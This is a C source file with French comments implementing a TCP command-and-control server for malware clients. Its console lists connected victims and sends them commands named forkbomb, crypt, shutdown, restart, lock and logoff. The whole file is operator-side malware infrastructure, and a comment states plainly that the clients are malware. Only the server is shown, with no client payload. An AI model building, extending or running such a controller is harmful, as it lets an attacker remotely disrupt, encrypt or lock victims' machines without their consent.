#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>

#define PORT 1053
#define MAX_CLIENTS 1053

int clients[MAX_CLIENTS];
char *clients_ip[MAX_CLIENTS];
int client_count = 0;

void *server_thread(void *arg) // Thread serveur
{
    int server_fd, new_socket, valread; // Socket file descriptor
    struct sockaddr_in address; // Adresse socket
    int opt = 1; // Options socket
    int addrlen = sizeof(address); // Longueur adresse socket
    char buffer[1024] = {0}; // Buffer

    // Creating socket file descriptor
    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) // AF_INET = IPv4, SOCK_STREAM = TCP
    {
        perror("socket failed");
        exit(EXIT_FAILURE);
    }

    // attaching socket to the port 1053
    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt))) // SOL_SOCKET = Socket level, SO_REUSEADDR = Reuse address
    {
        perror("setsockopt");
        exit(EXIT_FAILURE);
    }
    address.sin_family = AF_INET; // IPv4
    address.sin_addr.s_addr = INADDR_ANY; // Any address
    address.sin_port = htons( PORT ); // Port 1053

    // attaching socket to the port 1053
    if (bind(server_fd, (struct sockaddr *)&address,
                                 sizeof(address))<0) // Bind the socket to the address
    {
        perror("bind failed");
        exit(EXIT_FAILURE);
    }
    if (listen(server_fd, 3) < 0)
    {
        perror("listen");
        exit(EXIT_FAILURE);
    }
    while(1)
    {
        if ((new_socket = accept(server_fd, (struct sockaddr *)&address,
                       (socklen_t*)&addrlen))<0) // Accepte une nouvelle connexion
        {
            perror("accept");
            exit(EXIT_FAILURE);
        }
        clients[client_count] = new_socket; // Ajout du nouveau client dans la liste des clients
        printf("\nNouveau client connecte: %s:%d (id: %d) \n", inet_ntoa(address.sin_addr), ntohs(address.sin_port), client_count);
        clients_ip[client_count] = inet_ntoa(address.sin_addr); // Ajout de l'ip du nouveau client dans la liste des ip
        client_count++;
    }
}

void *check_clients(void *arg) // Vérifie si le client est toujours connecté 
{
    int i;
        dprintf(1,"Hey %d\n", client_count);
    while (1)
    {
        for(i = 0; i < client_count; i++)
        {
            if (clients[i] != 0)
            {
                if (send(clients[i], "ping", 4, 0) == -1) // Envoie ping client
                {
                    printf("Client %d deconnecte (%s) \n", i, clients_ip[i]);
                    close(clients[i]); // Fermeture du socket
                    clients[i] = 0; // Mettre le socket à 0
                }
            }
        }
        sleep(1);
    }
}

void send_message(char *message) // Envoyer message à tous les clients
{
    int i;
    for(i = 0; i < client_count; i++)
    {
        if (clients[i] != 0)
            send(clients[i], message, strlen(message), 0);
    }
}

void send_message_to(char *message, int id) // Envoyer message à un client spécifique
{
    if (id >= client_count)
        return;
    if (clients[id] != 0)
    send(clients[id], message, strlen(message), 0);
}

int main()
{
    pthread_t server;
    pthread_t check_client;

    system("clear");
    printf("Commandes:\n");
    printf("    exit - quitte le programme\n");
    printf("    send - envoi message a tous les clients | forkbomb - crypt - song - shutdown - restart - lock - logoff\n");
    printf("    clear - clear screen\n");
    printf("    help - display this message\n");
    printf("    list - lister tous les clients\n");
    pthread_create(&server, NULL, server_thread, NULL); // Création du thread serveur
    pthread_create(&check_client, NULL, check_clients, NULL); // Création du thread check clients
    while(1) // Boucle principale
    {
        char command[1024];
        printf("> ");
        scanf("%s", command); // Récupère la commande
        if (strcmp(command, "exit") == 0) // Sortir du programme
            break;
        if (strcmp(command, "send") == 0) // Envoyer message à un malware
        {
            char message[1024];
            int id;
            while ((getchar()) != '\n');
            printf ("Send to (id): ");
            scanf("%d", &id);
            while ((getchar()) != '\n');
            printf ("Command (ex: 'forkbomb'): ");
            scanf("%s", message);
            send_message_to(message, id);
        }
        if (strcmp(command, "clear") == 0) // Clear screen
            system("clear");
        if (strcmp(command, "help") == 0) // Afficher le message d'aide
        {
            printf("Commands:\n");
            printf("    exit - quitte le programme\n");
            printf("    send - envoi message a tous les clients | forkbomb - crypt - song - shutdown - restart - lock - logoff\n");
            printf("    clear - clear screen\n");
            printf("    help - display this message\n");
            printf("    list - lister tous les clients\n");
        }
        if (strcmp(command, "list") == 0) // Liste tous les clients connectés
        {
            int i;
            int count = 0;
            for (i = 0; i < client_count; i++)
            {
                if (clients[i] != 0)
                {
                    count++;
                }
            }
            if (count == 0)
            {
                printf("No clients connected\n");
                continue;
            }
            printf ("Clients (%d):\n", count);
            for(i = 0; i < client_count; i++)
            {
                if (clients[i] != 0)
                    printf("    Client - %d: %s\n", i, clients_ip[i]);
            }
        }
        // Clean scanf
        while ((getchar()) != '\n');
    }
    return 0;
}
